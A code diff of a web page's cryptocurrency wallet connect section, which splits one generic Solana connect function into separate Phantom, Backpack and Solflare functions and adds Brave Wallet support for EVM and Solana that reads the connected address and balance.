@@ -152,11 +152,20 @@
 
   <!-- Extension Section -->
   <div class="wallet-list" id="extensionSection">
-    <button class="wallet-btn" onclick="connectSolanaWallet()">
-      <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana Wallet" /> Phantom / Brave / Backpack / Solflare (Solana)
+    <button class="wallet-btn" onclick="connectPhantom()">
+      <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Phantom" /> Phantom (Solana)
+    </button>
+    <button class="wallet-btn" onclick="connectBackpack()">
+      <img src="https://pbs.twimg.com/profile_images/1732466769072377856/3U_Mu8vI_400x400.jpg" alt="Backpack" /> Backpack (Solana)
+    </button>
+    <button class="wallet-btn" onclick="connectSolflare()">
+      <img src="https://avatars.githubusercontent.com/u/70069609?s=200&v=4" alt="Solflare" /> Solflare (Solana)
     </button>
     <button class="wallet-btn" onclick="connectMetaMask()">
       <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2728406-2261817.png" alt="MetaMask" /> MetaMask (Ethereum)
+    </button>
+    <button class="wallet-btn" onclick="connectBraveWallet()">
+      <img src="https://cdn.jsdelivr.net/gh/brave/brave-browser/assets/brave-icon.png" alt="Brave Wallet" /> Brave Wallet (Multi-chain)
     </button>
     <div class="info" id="info"></div>
   </div>
@@ -218,27 +227,54 @@
       }
     }
 
-    // Updated function for Solana Wallet Standard support (Phantom, Brave, Backpack, Solflare, etc.)
-    async function connectSolanaWallet() {
-      if (window.solana) {
+    async function connectPhantom() {
+      if (window.solana && window.solana.isPhantom) {
         try {
-          let walletType = window.solana.isPhantom ? "Phantom"
-            : window.solana.isBackpack ? "Backpack"
-            : window.solana.isSolflare ? "Solflare"
-            : window.solana.isBrave ? "Brave"
-            : window.solana.walletName ? window.solana.walletName
-            : "Solana Wallet";
           const resp = await window.solana.connect();
           const address = resp.publicKey.toString();
           const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
           const balanceLamports = await connection.getBalance(new solanaWeb3.PublicKey(address));
           const balance = (balanceLamports / 1e9).toFixed(4);
-          postWallet(address, balance, walletType);
+          postWallet(address, balance, "Phantom");
         } catch (e) {
-          showInfo("Solana wallet connection failed!");
+          showInfo("Phantom connection failed!");
         }
       } else {
-        showInfo("No Solana wallet detected! Try Phantom, Backpack, Solflare, or Brave Wallet.", "https://phantom.app/download");
+        showInfo("Phantom wallet not found!", "https://phantom.app/download");
+      }
+    }
+
+    async function connectBackpack() {
+      if (window.backpack && window.backpack.isBackpack) {
+        try {
+          const resp = await window.backpack.connect();
+          const address = resp.publicKey.toString();
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+          const balanceLamports = await connection.getBalance(new solanaWeb3.PublicKey(address));
+          const balance = (balanceLamports / 1e9).toFixed(4);
+          postWallet(address, balance, "Backpack");
+        } catch (e) {
+          showInfo("Backpack connection failed!");
+        }
+      } else {
+        showInfo("Backpack wallet not found!", "https://backpack.app/download");
+      }
+    }
+
+    async function connectSolflare() {
+      if (window.solflare && window.solflare.isSolflare) {
+        try {
+          const resp = await window.solflare.connect();
+          const address = resp.publicKey.toString();
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+          const balanceLamports = await connection.getBalance(new solanaWeb3.PublicKey(address));
+          const balance = (balanceLamports / 1e9).toFixed(4);
+          postWallet(address, balance, "Solflare");
+        } catch (e) {
+          showInfo("Solflare connection failed!");
+        }
+      } else {
+        showInfo("Solflare wallet not found!", "https://solflare.com/download");
       }
     }
 
@@ -257,6 +293,54 @@
         }
       } else {
         showInfo("MetaMask not found!", "https://metamask.io/download.html");
+      }
+    }
+
+    // Brave Wallet: supports both EVM and Solana (desktop Brave browser only)
+    async function connectBraveWallet() {
+      // Brave Wallet injects window.ethereum for EVM and window.solana for Solana
+      let isBrave = (!!navigator.brave && typeof navigator.brave.isBrave === "function") ||
+                    (window.ethereum && window.ethereum.isBraveWallet) ||
+                    (window.solana && window.solana.isBrave);
+      if (isBrave && window.ethereum) {
+        // Try EVM connection via Brave Wallet
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+          const balanceWei = await provider.getBalance(address);
+          const balanceEth = ethers.utils.formatEther(balanceWei);
+          postWallet(address, parseFloat(balanceEth).toFixed(4), "Brave Wallet (EVM)");
+          return;
+        } catch (e) {
+          showInfo("Brave Wallet (EVM) connection failed!");
+          return;
+        }
+      }
+      if (isBrave && window.solana && window.solana.isBrave) {
+        // Try Solana connection via Brave Wallet
+        try {
+          const resp = await window.solana.connect();
+          const address = resp.publicKey.toString();
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+          const balanceLamports = await connection.getBalance(new solanaWeb3.PublicKey(address));
+          const balance = (balanceLamports / 1e9).toFixed(4);
+          postWallet(address, balance, "Brave Wallet (Solana)");
+          return;
+        } catch (e) {
+          showInfo("Brave Wallet (Solana) connection failed!");
+          return;
+        }
+      }
+      // Fallback: detect Brave browser but wallet not enabled
+      if ((window.ethereum && window.ethereum.isBraveWallet) || (window.solana && window.solana.isBrave)) {
+        showInfo("Brave Wallet detected, but unable to connect.");
+      } else {
+        showInfo(
+          "Brave Wallet not detected! You need Brave Browser with Brave Wallet enabled.",
+          "https://brave.com/wallet/"
+        );
       }
     }
   </script>
